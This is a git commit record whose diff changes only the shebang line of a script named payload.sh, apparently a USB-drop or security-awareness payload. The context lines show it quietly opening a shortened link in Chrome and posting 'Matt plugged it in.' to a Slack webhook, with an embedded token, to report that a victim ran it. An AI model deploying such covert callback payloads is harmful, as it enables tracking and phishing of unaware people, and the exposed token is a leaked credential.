dd7173792198ca48bff703e40706171b152c13d0
Daniel Craig <daniel.craig@xqdigitalresilience.com>
2017-12-15 20:55:39 +0000

    update shebang

--- payload.sh
+++ payload.sh
@@ -1,4 +1,4 @@
-#!/bin/env sh
+#!/usr/bin/env sh
 
 google-chrome http://bit.ly/2BeF8NQ &
 curl -s --data 'Matt plugged it in.' 'https://xqcyber.slack.com/services/hooks/slackbot?token=1rlkowhNDZPOnpdcVuMVnLt5&channel=%40daniel.craig' &
